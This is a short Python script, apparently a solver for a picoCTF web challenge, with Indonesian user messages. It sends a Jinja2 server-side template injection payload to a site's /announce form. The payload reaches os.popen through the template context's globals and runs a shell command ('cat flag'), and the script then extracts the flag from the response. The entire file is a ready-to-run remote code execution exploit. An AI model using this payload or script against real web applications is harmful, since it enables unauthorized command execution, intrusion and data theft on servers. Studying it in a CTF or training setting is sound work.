import sys
import requests
import re
import urllib3

def main():
    if len(sys.argv) != 2:
        print("Usage: masukkan url website")
        sys.exit(1)
    url = sys.argv[1].rstrip('/')
    headers = {
        'Content-Type': 'application/x-www-form-urlencoded',
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/144.0.0.0 Safari/537.36',
        'Referer': url + '/',
        'Origin': url,
    }
    s = requests.Session()
    url_post = url + '/announce'
    data = {'content': '{{self._TemplateReference__context.cycler.__init__.__globals__.os.popen("cat flag").read()}}'}
    r = s.post(url_post, data=data, headers=headers)
    res = r.text
    flag = re.search(r'picoCTF\{.*?\}', res)
    if flag:
        print(flag.group())
    else:
        print("Flag tidak ditemukan. Response:", res)

if __name__ == "__main__":
    main()
